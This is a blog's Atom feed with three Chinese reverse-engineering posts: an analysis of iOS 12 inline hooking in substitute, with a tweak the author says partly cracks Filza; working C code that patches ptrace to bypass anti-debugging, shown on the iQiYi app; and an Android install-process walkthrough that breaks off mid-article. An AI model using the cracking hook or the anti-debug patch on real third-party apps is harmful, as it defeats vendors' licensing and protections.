<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-08-19T09:59:29.587Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iOS12内存patch remap bug分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/</id>
    <published>2019-08-15T16:22:28.000Z</published>
    <updated>2019-08-19T09:59:29.587Z</updated>
    
    <content type="html"><![CDATA[<h3 id="iOS12内存patch-remap-bug分析"><a href="#iOS12内存patch-remap-bug分析" class="headerlink" title="iOS12内存patch remap bug分析"></a>iOS12内存patch remap bug分析</h3><h4 id="iOS12-MSHookFunction分析"><a href="#iOS12-MSHookFunction分析" class="headerlink" title="iOS12 MSHookFunction分析"></a>iOS12 MSHookFunction分析</h4><p>在iOS12越狱上面<code>CydiaSubstrate</code>指向的是<code>libsubstrate.dylib</code></p><p><code>/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate -&gt; ../../../usr/lib/libsubstrate.dylib</code></p><p>我们常用的<code>MSHookFunction</code>函数的实现就是在<code>libsubstrate.dylib</code>这里面，不过在这里仅仅是<code>SubHookFunction</code>的封装。而<code>SubHookFunction</code>的实现却是在<code>/usr/lib/libsubstitute.0.dylib</code>这里</p><p><code>/usr/lib/libsubstitute.0.dylib</code>是一个软连接指向<code>libsubstitute.dylib</code>。这里的<code>libsubstitute.dylib</code>就是coolstar维护的版本。下面分析<code>libsubstitute.dylib</code>的inlinehook实现细节。</p><p>下面是我写的一个tweak插件代码（<del>没错就是破解Filza的，不过只是部分代码</del>），hook了<code>_ZTL7624417887</code>函数。</p><pre><code class="c">static BOOL (*original_ZTL7624417887)(int a1, int a2, int a3); BOOL new_ZTL7624417887(int a1, int a2, int a3){    NSLog(@&quot;====xxxx===hook ZTL7624417887---&gt;%d&quot;, 0);    return 0;}%ctor{        MSImageRef  image =  MSGetImageByName(&quot;/Applications/Filza.app/Filza&quot;);    NSLog(@&quot;===xxx===image:%p&quot;, image);    void* ZTL7624417887 = (void*)MSFindSymbol(image, &quot;_ZTL7624417887&quot;);    NSLog(@&quot;===xxx===ZTL7624417887:%p&quot;, ZTL7624417887);    MSHookFunction((void*)ZTL7624417887, (void*)new_ZTL7624417887, (void**)&amp;original_ZTL7624417887);}</code></pre><p><strong>调试分析</strong></p><p>对<code>MSHookFunction</code>下断点，发现断在了我们预想的位置。</p><pre><code>CydiaSubstrate`MSHookFunction:-&gt;  0x10550fca0 &lt;+0&gt;:  cbz    x0, 0x10550fca8           ; &lt;+8&gt;    0x10550fca4 &lt;+4&gt;:  b      0x10550fe80               ; symbol stub for: SubHookFunction    0x10550fca8 &lt;+8&gt;:  ret</code></pre><pre><code>(lldb) re re General Purpose Registers:        x0 = 0x000000010489a068  Filza`ZTL7624417887        x1 = 0x00000001055bbbec  xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19        x2 = 0x00000001055bc148  xkfilza.dylib`original_ZTL7624417887</code></pre><pre><code>* frame #0: 0x000000010550fca0 CydiaSubstrate`MSHookFunction    frame #1: 0x00000001055bbcd0 xkfilza.dylib`_logosLocalCtor_9eb4d9ed(argc=1, argv=0x000000016b657b50, envp=0x000000016b657b60) at Tweak.xm:29    frame #2: 0x00000001055df56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 424    frame #3: 0x00000001055df7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 40</code></pre><p>X0就是hook的函数地址，X1为替换的函数地址，X2为保存的原函数地址。</p><p>先看一下这三个地址的数据，如下所见，此时<code>ZTL7624417887</code>还没有hook，所以前几个指令没有变化。</p><pre><code>// ZTL7624417887 函数指令(lldb) x/5i 0x000000010489a068    0x10489a068: 0xd2800008   mov    x8, #0x0    0x10489a06c: 0xf0003489   adrp   x9, 1683    0x10489a070: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x10489a074: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x10489a078: 0x6b00015f   cmp    w10, w0// new_ZTL7624417887 函数指令(lldb) x/5i 0x00000001055bbbec    0x1055bbbec: 0xd503237f   pacibsp     0x1055bbbf0: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x1055bbbf4: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x1055bbbf8: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x1055bbbfc: 0xb81fc3a0   stur   w0, [x29, #-0x4]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x00000001055bc1480x1055bc148: 0x0000000000000000 0x00000000000000000x1055bc158: 0x0000000000000000 0x00000000000000000x1055bc168: 0x0000000000000000</code></pre><p>这里是我们单步执行两次，使其执行hook函数。这次再观察一下这三个地址的数据</p><pre><code>// ZTL7624417887 函数指令(lldb) x/5i 0x000000010489a068    0x10489a068: 0xb0006911   adrp   x17, 3361    0x10489a06c: 0x912fb231   add    x17, x17, #0xbec          ; =0xbec     0x10489a070: 0xd61f0220   br     x17    0x10489a074: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x10489a078: 0x6b00015f   cmp    w10, w0// new_ZTL7624417887 函数指令(lldb) x/5i 0x00000001055bbbec    0x1055bbbec: 0xd503237f   pacibsp     0x1055bbbf0: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x1055bbbf4: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x1055bbbf8: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x1055bbbfc: 0xb81fc3a0   stur   w0, [x29, #-0x4]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x00000001055bc1480x1055bc148: 0x0000000106e38000 0x00000000000000000x1055bc158: 0x0000000000000000 0x00000000000000000x1055bc168: 0x0000000000000000</code></pre><p>这里发现原函数前三个字节和<code>original_ZTL7624417887</code>这个函数指令数据都发生了变化。</p><pre><code class="assembly">0x10489a068: 0xb0006911   adrp   x17, 33610x10489a06c: 0x912fb231   add    x17, x17, #0xbec          ; =0xbec 0x10489a070: 0xd61f0220   br     x17</code></pre><p>这三条指令就是将原始执行流跳转到其他地址（这里也可以发现hook的函数至少大于3条指令，不然会覆盖其他函数）。这里简单计算就可以算出X17目标地址</p><pre><code>(lldb) p/x (0x10489a068 &amp; ~(0x1000-0x1))+ (3361&lt;&lt;12) + 0xbec(long) $3 = 0x00000001055bbbec</code></pre><p>所以会跳转到<code>0x00000001055bbbec</code>这个地址，等等！这个地址不就是<code>new_ZTL7624417887</code>我们hook代码的函数地址吗？所以函数hook就是通过修改前三条指令跳转到我们定义的函数来实现hook的。</p><p>这里还有个问题在于，如果我们在hook代码里面需要执行原函数，那么<code>original_ZTL7624417887</code>处保存的又是什么函数指针？所以这里跟一下<code>0x0000000106e38000</code>这个地址。</p><pre><code>(lldb) x/12i 0x0000000106e38000    0x106e38000: 0xd2800008   mov    x8, #0x0    0x106e38004: 0xd29a0009   mov    x9, #0xd000    0x106e38008: 0xf2a09e49   movk   x9, #0x4f2, lsl #16    0x106e3800c: 0xf2c00029   movk   x9, #0x1, lsl #32    0x106e38010: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x106e38014: 0xd0fed311   adrp   x17, -9630    0x106e38018: 0x9101d231   add    x17, x17, #0x74           ; =0x74     0x106e3801c: 0xd61f0220   br     x17</code></pre><p>这里可以看出也是一个跳转，可以计算出X17跳转后的地址</p><pre><code>(lldb) p/x (0x106e38014 &amp; ~(0x1000-0x1)) - (9630&lt;&lt;12) + 0x74(long) $4 = 0x000000010489a074</code></pre><p>再等等！这个地址不就是<code>ZTL7624417887</code>函数的第四条指令的地址吗，跳转到这里正好调用了原函数，但是有个问题在于，原函数的前三条指令去哪了？仔细观察上面的指令和原函数的前三条指令</p><pre><code>//原函数前三条指令0x10489a068: 0xd2800008   mov    x8, #0x00x10489a06c: 0xf0003489   adrp   x9, 16830x10489a070: 0x911a4129   add    x9, x9, #0x690            ; =0x690// original_ZTL7624417887函数指针的指令0x106e38000: 0xd2800008   mov    x8, #0x00x106e38004: 0xd29a0009   mov    x9, #0xd0000x106e38008: 0xf2a09e49   movk   x9, #0x4f2, lsl #160x106e3800c: 0xf2c00029   movk   x9, #0x1, lsl #320x106e38010: 0x911a4129   add    x9, x9, #0x690            ; =0x690</code></pre><p>稍加思索就知道，虽然指令不一样，但是结果却是一样的。为什么不直接写入原三条指令呢？这里涉及到<code>adrp</code>这个指令的相对寻址问题。由于<code>adrp</code>会根据当前pc值来计算，这样直接复制的话pc值已经变化，所以这里不得不重新计算X9的值。到这里，<code>MSHookFunction</code>的hook过程我们已经完全清楚了。</p><p>####MSHookFunction如何解决内存patch的问题</p><p>由于<code>substitute</code>开源的，所以可以结合源码分析。源码在<a href="https://github.com/coolstar/substitute">这里</a></p><p><code>SubHookFunction</code>函数伪代码，此时的函数参数为</p><pre><code>x0 = 0x00000001005de068  Filza`ZTL7624417887x1 = 0x0000000102c9bbec  xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19x2 = 0x0000000102c9c148  xkfilza.dylib`original_ZTL7624417887</code></pre><p>就是原函数地址，替换的函数地址，保存原函数地址的指针</p><pre><code class="c">__int64 __fastcall SubHookFunction(__int64 a1, __int64 a2, __int64 a3){  __int64 result; // x0  FILE *v4; // x19  __int64 v5; // ST00_8  __int64 v6; // [xsp+10h] [xbp-30h]  __int64 v7; // [xsp+18h] [xbp-28h]  __int64 v8; // [xsp+20h] [xbp-20h]  int v9; // [xsp+28h] [xbp-18h]  v6 = a1;  v7 = a2;  v8 = a3;  v9 = 0;  result = substitute_hook_functions((__int64)&amp;v6, 1uLL, 0LL, 1);  if ( (_DWORD)result )  {    v4 = __stderrp;    v5 = substitute_strerror();    fprintf(v4, &quot;SubHookFunction: substitute_hook_functions returned %s\n&quot;, v5);    abort();  }  return result;}</code></pre><p>对应源码<code>substitute/lib/darwin/substrate-compat.c</code></p><pre><code class="c">void SubHookFunction(void *symbol, void *replace, void **result)    __asm__(&quot;SubHookFunction&quot;);void SubHookFunction(void *symbol, void *replace, void **result) {    struct substitute_function_hook hook = {symbol, replace, result};    int ret = substitute_hook_functions(&amp;hook, 1, NULL,                                        SUBSTITUTE_NO_THREAD_SAFETY);    if (ret) {        substitute_panic(&quot;SubHookFunction: substitute_hook_functions returned %s\n&quot;,                         substitute_strerror(ret));    }}</code></pre><p>再跟一下到<code>substitute_hook_functions</code>函数。</p><p>对应源码<code>substitute/lib/hook-functions.c</code></p><p>还在分析中…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;iOS12内存patch-remap-bug分析&quot;&gt;&lt;a href=&quot;#iOS12内存patch-remap-bug分析&quot; class=&quot;headerlink&quot; title=&quot;iOS12内存patch remap bug分析&quot;&gt;&lt;/a&gt;iOS12内存patch r
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="hook" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>iOS LLDB中反反调试分析与实现</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/</id>
    <published>2019-08-12T11:16:01.000Z</published>
    <updated>2019-08-13T17:41:50.131Z</updated>
    
    <content type="html"><![CDATA[<h3 id="iOS-LLDB中反反调试分析与实现"><a href="#iOS-LLDB中反反调试分析与实现" class="headerlink" title="iOS LLDB中反反调试分析与实现"></a>iOS LLDB中反反调试分析与实现</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于反调试和反反调试，已经有很多人分析过了，也有很多解决方案。但是在LLDB中做反反调试还没人做过，这也是我一直想解决的一个方案，毕竟本身就是为了调试，那么在LLDB直接输入一行命令就能反反调试应该相对酸爽。本文将介绍一种基于内存单指令patch的方式进行反反调试的方案，大概意思就是通过直接修改代码段的指令来绕过反调试机制。</p><h4 id="目前反调试与反反调试情况"><a href="#目前反调试与反反调试情况" class="headerlink" title="目前反调试与反反调试情况"></a>目前反调试与反反调试情况</h4><p>这里庆哥写了一遍文章分析了 <a href="http://iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a></p><p>这里简单归纳一下，有如下几种：</p><ul><li>ptrace</li><li>sysctl</li><li>syscall</li><li>SIGTOP</li><li>task_get_exception_ports</li></ul><p>这里实际上就大概三种，其他都是基于ptrace的变种。ptrace这个函数是linux就提供的一个接口，常常用作linux系的反调试，本质就是通过26号系统调用来完成的，目前大多反调试都利用该方案。</p><p>后面看到庆哥同样提供了一个反反调试的LLDB脚本，不过看了下和我的思路还是不一样的。（<del>差点以为白做了）</del></p><p>正如文章里面写到通过<code>lldb</code>下断点，然后修改参数，或者直接返回也可以达到反反调试的效果。由于要不断去检查执行状态等，或者程序有定时器定时检测，这个脚本影响性能及变得很卡影响调试体验。不过还是膜庆哥的方案，学习了。</p><h4 id="内存patch实现反反调试"><a href="#内存patch实现反反调试" class="headerlink" title="内存patch实现反反调试"></a>内存patch实现反反调试</h4><p>说一下大概思路：</p><ul><li>内存中找到<code>ptrace</code>地址</li><li>将该内存map为<code>rwx</code></li><li><p>直接将首调指令修改为<code>ret</code>指令</p><p>刚开始以为就这样简单就完了，结果实际写代码的时候才发现过程远比想象中复杂。</p></li></ul><p>由于iOS不允许直接将代码段map为写权限，这里调用<code>mach_vm_protect</code>或<code>mprotect</code>都会异常。但是类似frida、substitute以及hookzz都能进行指令hook。这样说来，肯定是可以修改代码段的。看了下substitute以及frida中关于这块的实现，才发现可以用一种remap的方式修改代码段。</p><p>大致的流程如下：</p><ul><li>使用mmap新建一块内存，把这块内存叫做new</li><li>使用vm_copy把想要篡改的处于__text段内的内存（把这块内存叫target）拷贝到new里</li><li>向new里写入想执行的代码</li><li>调用mprotect把new改为rx。因为mmap出来的内存的max_protection是rwx，所以这里mprotect改权限没问题</li><li>调用mach_vm_remap把new的内容反映回target里</li></ul><p>不过当我写代码测试的时候发现，remap以后整个页数据都变成了0。实在不清楚原因，向Zz求助，Zz直接扔了我他实现这块的代码。我看了以后收益匪浅，只怪之前没分析hookzz的具体实现。后面才知道由于我的设备是iOS12，Zz意思是codesign的问题，hookZz也没支持。于是换了一台iOS9的设备，果然就可以了，向Zz低头。</p><p>期间还由于我手残忘记调用mprotect把new改为rx。导致直接执行异常，用<code>memory region</code>查看地址才知道页保护属性为<code>rw</code>。</p><p>相关代码如下：</p><p>1、map new page for patch</p><pre><code class="c">    // map new page for patch    void *new = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);    if (!new ){        NSLog(@&quot;[-] mmap failed!&quot;);        return;    }    NSLog(@&quot;[*] new map address:%p&quot;, new);</code></pre><p>2、start patch</p><pre><code class="c">    // start patch        kret = vm_copy(self_task, (unsigned long)page_start, 0x1000, (vm_address_t) new);    if (kret != KERN_SUCCESS){        NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno);        return;    }    char patch_ret_ins_data[4] = {0xc0, 0x03, 0x5f, 0xd6}; // ret     memcpy((void *)(new+patch_offset), patch_ret_ins_data, 4);    NSLog(@&quot;[*] new map+offset address:%p&quot;, (void *)(new+patch_offset));</code></pre><p>3、set new page back to r-x</p><pre><code class="c">    // set back to r-x    int ret = mprotect(new, 0x1000, PROT_READ | PROT_EXEC);    NSLog(@&quot;[*] ret: %d, errno: %d, addr: %p&quot;, ret, errno, new);</code></pre><p>4、remap the target page</p><pre><code class="c">    kret = mach_vm_remap(mach_task_self(), &amp;target, 0x1000, 0,                       VM_FLAGS_OVERWRITE, self_task,                       (mach_vm_address_t) new, TRUE,                       &amp;c, &amp;m, inherit);    if(kret != KERN_SUCCESS){        NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno);        return;    }    NSLog(@&quot;[*] now ptrace_ptr address:%p&quot;, ptrace_ptr)</code></pre><p>5、clear cache</p><pre><code class="c">    void* clear_start_ = (void*)page_start + patch_offset;  sys_icache_invalidate (clear_start_, 4);  sys_dcache_flush (clear_start_, 4);</code></pre><p>完整的代码在xia0LLDB里面已经集成：<a href="https://github.com/4ch12dy/xia0LLDB">https://github.com/4ch12dy/xia0LLDB</a></p><h4 id="一个简单反反调试实验"><a href="#一个简单反反调试实验" class="headerlink" title="一个简单反反调试实验"></a>一个简单反反调试实验</h4><p>这里以爱奇艺为例子分析，爱奇艺在main函数里面动态调用了ptrace函数进行反调试。</p><ul><li><p>后台启动方式启动爱奇艺</p><pre><code class="shell">xia0 ~ $ issh debug -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo[I]:iproxy process for 2222 port alive, pid=16264 [I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [I]:iOSRE dir exist [I]:iproxy process for 1234 port alive, pid=16428 [I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [I]:/iOSRE/tools/debugserver file exist, Start debug... [I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo</code></pre></li><li><p>LLDB挂上以后在main函数下断点以后直接执行<code>debugme</code>命令</p><pre><code>(lldb) debugmeKill antiDebug by xia0:[*] ptrace target address: 0x1837dc180 and offset: 0x180[*] mmap new page: 0x1021ec000 success. [+] vm_copy target to new page.[+] patch ret[0xc0 0x03 0x5f 0xd6] with memcpy[*] set new page back to r-x success![*] get page info done.[+] remap to target success![*] clear cache success![+] all done! happy debug~</code></pre><p>下面查看对比下patch前后指令ptrace首指令的变化</p><p>Patch之前</p><pre><code>(lldb) x/12i 0x00000001837dc180    0x1837dc180: 0xf00f26a9   adrp   x9, 124119    0x1837dc184: 0x91034129   add    x9, x9, #0xd0             ; =0xd0     0x1837dc188: 0xb900013f   str    wzr, [x9]    0x1837dc18c: 0xd2800350   mov    x16, #0x1a    0x1837dc190: 0xd4001001   svc    #0x80    0x1837dc194: 0x540000c3   b.lo   0x1837dc1ac               ; &lt;+44&gt;    0x1837dc198: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!    0x1837dc19c: 0x910003fd   mov    x29, sp    0x1837dc1a0: 0x97ff9b08   bl     0x1837c2dc0               ; cerror    0x1837dc1a4: 0x910003bf   mov    sp, x29    0x1837dc1a8: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10    0x1837dc1ac: 0xd65f03c0   ret</code></pre><p>Patch之后</p><pre><code>(lldb) x/12i 0x1837dc180    0x1837dc180: 0xd65f03c0   ret        0x1837dc184: 0x91034129   add    x9, x9, #0xd0             ; =0xd0     0x1837dc188: 0xb900013f   str    wzr, [x9]    0x1837dc18c: 0xd2800350   mov    x16, #0x1a    0x1837dc190: 0xd4001001   svc    #0x80    0x1837dc194: 0x540000c3   b.lo   0x1837dc1ac               ; &lt;+44&gt;    0x1837dc198: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!    0x1837dc19c: 0x910003fd   mov    x29, sp    0x1837dc1a0: 0x97ff9b08   bl     0x1837c2dc0               ; cerror    0x1837dc1a4: 0x910003bf   mov    sp, x29    0x1837dc1a8: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10    0x1837dc1ac: 0xd65f03c0   ret</code></pre><p>可以发现首地址已经变成了ret指令。</p></li><li><p>执行continue命令，发现爱奇艺已经能够正常调试。</p><pre><code>(lldb) cProcess 3176 resuming2019-08-13 17:22:17.283 iQiYiPhoneVideo[3176:161840] [plcrash]: init ok2019-08-13 17:22:17.790 iQiYiPhoneVideo[3176:161840] -[QYBaikePageDurationManager bk_appDidBecomeActive:]2019-08-13 17:22:17.922 iQiYiPhoneVideo[3176:161840] CoreData: Failed to load optimized model at path &#39;/var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/QYPGCDataModel.momd/QYPGCDataModel_970.omo&#39;2019-08-13 17:22:20.477 iQiYiPhoneVideo[3176:161840] OSStatus error: [-34018] Security error has occurred.2019-08-13 17:22:20.558 iQiYiPhoneVideo[3176:162000] OSStatus error: [-34018] Security error has occurred.3176:161840] Incorrect NSStringEncoding value 0x8000100 detected. Assuming NSASCIIStringEncoding. Will stop this compatiblity mapping behavior in the near future.ontainers/Data/Application/5C31FE18-9BA4-4B2D-80C6-68BF7F65855F/Library/Application Support/爱奇艺/0_im.sqlite</code></pre></li></ul><h4 id="总结-Todo"><a href="#总结-Todo" class="headerlink" title="总结/Todo"></a>总结/Todo</h4><p>这里只是简单的绕过了ptrace方式的反调试，针对直接用汇编写的反调试我的做法是静态内存搜索匹配svc位置，发现是调用26号系统调用则利用内存patch为nop。或者写一个简单的hook代码，hook所有的svc地址，判断寄存器的值然后进行hook即可，这样就能绕过这些反调试机制，再次向Zz和庆哥低头。</p><h4 id="参考-致谢"><a href="#参考-致谢" class="headerlink" title="参考/致谢"></a>参考/致谢</h4><ul><li><p><a href="https://gist.github.com/piaoger/4ba83f6a954bca113505" target="_blank" rel="external">https://gist.github.com/piaoger/4ba83f6a954bca113505</a></p></li><li><p><a href="https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c">https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c</a></p></li><li><p><a href="https://www.codercto.com/a/63507.html" target="_blank" rel="external">https://www.codercto.com/a/63507.html</a></p></li><li><p><a href="https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26">https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26</a></p></li><li><p><a href="https://github.com/gdbinit/readmem/blob/master/readmem/main.c">https://github.com/gdbinit/readmem/blob/master/readmem/main.c</a></p></li><li><p><a href="https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h">https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h</a></p></li><li><p><a href="http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c" target="_blank" rel="external">http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c</a></p></li><li><p><a href="https://github.com/DaKnOb/memscan/blob/master/main.mm">https://github.com/DaKnOb/memscan/blob/master/main.mm</a></p></li><li><p><a href="http://iosre.com/t/topic/8179" target="_blank" rel="external">http://iosre.com/t/topic/8179</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;iOS-LLDB中反反调试分析与实现&quot;&gt;&lt;a href=&quot;#iOS-LLDB中反反调试分析与实现&quot; class=&quot;headerlink&quot; title=&quot;iOS LLDB中反反调试分析与实现&quot;&gt;&lt;/a&gt;iOS LLDB中反反调试分析与实现&lt;/h3&gt;&lt;h4 id=&quot;开
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>Android应用安装过程深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/</id>
    <published>2019-08-01T07:08:31.000Z</published>
    <updated>2019-08-01T10:29:23.735Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android应用安装过程深度解析"><a href="#Android应用安装过程深度解析" class="headerlink" title="Android应用安装过程深度解析"></a>Android应用安装过程深度解析</h3><blockquote><p>本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。</p></blockquote><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。</p><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><p>一个 Android 应用安装到手机上大致分为四种情形：</p><ul><li>系统应用，在设备每次启动时完成安装</li><li>通过 adb install 命令安装</li><li>应用市场安装，封装安装过程（略）</li><li>第三方应用安装或双击安装包，会启动系统应用引导安装</li></ul><p>无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。</p><h4 id="场景一：系统应用安装"><a href="#场景一：系统应用安装" class="headerlink" title="场景一：系统应用安装"></a>场景一：系统应用安装</h4><p>在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801151901799.png?raw=true" alt="image-20190801151901799"></p><p><strong>补充：system_server 的启动与运行流程</strong></p><p>system_server 由 zygote 进程孵化，是整个 Android Framework 的基础</p><p>zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152013042.png?raw=true" alt="image-20190801152013042"></p><p>ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信</p><p>RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法</p><p>SystemServer 的 run() 方法中会完成以下工作：</p><ul><li>设置时间、语言等，设置虚拟机库文件，设置内存</li><li>Looper.prepareMainLooper() 主线程 looper 运行在当前线程</li><li>加载库文件 android_servers，位于 /frameworks/base/services</li><li>createSystemContext() 初始化系统上下文</li><li>SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中</li><li>启动各种系统服务，包括引导服务、核心服务、其他服务</li><li>开启循环，等待其他线程通过 handler 发送消息到主线程来处理</li></ul><p>在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152050671.png?raw=true" alt="image-20190801152050671"></p><p>PackageManagerService 类构造函数中完成了许多工作，主要包含：</p><ul><li>创建 Settings 对象，添加系统的 SharedUser 信息</li><li>为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的</li><li>创建 PackageDexOptimizer 和 DexManager 对象</li><li>获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures</li><li>创建 ServiceThread 和 PackagerHandler 对象</li><li>创建 UserManagerService，支持多用户</li><li>读取系统定义的权限保存到 permConfig 变量中</li><li>读取系统共享库保存到 libConfig 变量中</li><li>解析 package.xml 文件中的内容保存到 ArrayMap<string, packageparser.package=""> 结构中</string,></li><li>配置扫描参数 scanFlags</li><li>开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app</li><li>开始扫描非系统应用，包括目录 /data/app、/data/app-private</li><li>启动内存垃圾回收</li><li>启动私有服务 PackageManagerInternal</li></ul><p>总结来说主要是这几项内容：</p><ul><li>创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接</li><li>扫描各目录下 apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理）</li><li>创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求</li><li>解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射</li></ul><p>详细说明各项：</p><p>Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152128607.png?raw=true" alt="image-20190801152128607"></p><p>Installer 在 SystemServer 